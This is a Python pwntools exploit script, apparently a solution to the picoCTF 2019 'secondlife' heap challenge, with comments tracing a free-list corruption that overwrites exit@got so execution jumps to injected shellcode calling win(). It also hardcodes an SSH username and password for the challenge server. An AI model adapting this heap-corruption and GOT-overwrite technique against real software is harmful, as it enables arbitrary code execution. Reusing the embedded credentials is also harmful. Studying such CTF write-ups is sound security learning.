#!/usr/bin/env python3
from pwn import *

# Controllable address: first, sixth
# ------------+-------------------------------------+----------------+
# Step (Line) | Heap usage                          | Free list      |
# ------------+-------------------------------------+----------------+
#   1. (28)   | first, second, third, fourth        |   X            |
# ------------+-------------------------------------+----------------+
#   2. (29)   | [first], second, third, fourth      | first          |
# ------------+-------------------------------------+----------------+
#   3. (30)   | [first], second, [third], fourth    | third -> first |
# ------------+-------------------------------------+----------------+
#   4. (31)   | [first], second, fifth, fourth      | first          |
# ------------+-------------------------------------+----------------+
#   5. (32)   | [first], second, fifth, fourth      | first -> first |
# ------------+-------------------------------------+----------------+
#   6. (33)   | sixth, second, [third], fourth      | first          |
# ------------+-------------------------------------+----------------+
#   7. (36)   | seventh(!), second, [third], fourth |   X            |
# ------------+-------------------------------------+----------------+
#
# At step 7, we are going to malloc a new chunk that is already
# malloced and written data! The is a typical unsorted bin attack.
#
# Once we can control the content of the unsorted bin, we can take
# advantage of the following code snippet to write arbitrary data.
#
# unsorted_chunks(av)->bk = bck;
# bck->fd = unsorted_chunks(av);
#
# This is similar to unlink, but silghtly different. We only need to
# control the bk pointer.
# Since "sixth" equals to "seventh", we can control seventh by writing
# to sixth.
#
# The idea is to overwrite the exit@got with a heap address. The heap
# address contains the shellcode to get the flag.
# Reference:
# * https://kabeor.cn/%E5%A0%86%E6%BA%A2%E5%87%BA-Unsorted%20Bin%20Attack/#Unsorted-Bin-%E7%9A%84%E4%BD%BF%E7%94%A8
# * http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf

context(arch='i386', terminal=['tmux', 'neww'])

remote = ssh('afcidk', '2019shell1.picoctf.com', password='ji32k7au4a83')
remote.set_working_directory(
    b'/problems/secondlife_6_c4811a8968ff26d298eda578d3b92255')
r = remote.process('./vuln')
e = ELF('./vuln')
#gdb.attach(r)

r.recvline()
addr = int(r.recvline().split(b'\n')[0])
win = e.symbols['win']
exit_got = e.got['exit']
print(f'[+] addr:     {hex(addr)}')
print(f'[+] win:      {hex(win)}')
print(f'[+] exit@got: {hex(exit_got)}')

payload = b'a' * 12  # offset
payload += asm(f'push {hex(win)}; ret;')  # shellcode

payload2 = p32(exit_got - 12)  # fd
payload2 += p32(addr + 12)  # bk

r.sendline(payload)
r.sendline(payload2)
r.interactive()
